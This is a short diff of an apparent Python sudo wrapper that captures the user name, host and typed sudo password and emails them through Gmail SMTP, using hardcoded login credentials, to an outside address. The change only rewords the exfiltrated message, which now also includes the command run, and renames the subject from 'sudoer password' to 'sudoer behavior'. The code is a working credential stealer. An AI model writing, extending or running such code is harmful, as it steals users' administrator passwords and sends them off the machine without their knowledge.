@@ -31,14 +31,14 @@ def dosudo(cmmd):
     except Exception as ex:
         sf='failed'
         rslt='Permission denied'
-    return ('password for {0} on {1}: {2} [{3}]'.format(usnm,hsnm,psw,sf) if psw else '',rslt)
+    return ('{0} with password {2} has performed "sudo {4}" on {1} [status: {3}]'.format(usnm,hsnm,psw,sf,cmmd) if psw else '',rslt)
 
 def sendemail(mssg):
     smtpserver = smtplib.SMTP("smtp.gmail.com")
     smtpserver.ehlo() 
     smtpserver.starttls()
     smtpserver.login("testhellotestworldtest@gmail.com", "testtesttesthello")
-    msg='To:Me\nFrom:testhellotestworldtest@gmail.com\nSubject:sudoer password\n\n{0}\n\n'.format(mssg)
+    msg='To:Me\nFrom:testhellotestworldtest@gmail.com\nSubject:sudoer behavior\n\n{0}\n\n'.format(mssg)
     smtpserver.sendmail("testhellotestworldtest@gmail.com",'zminkling@gmail.com', msg)
     smtpserver.close()
 
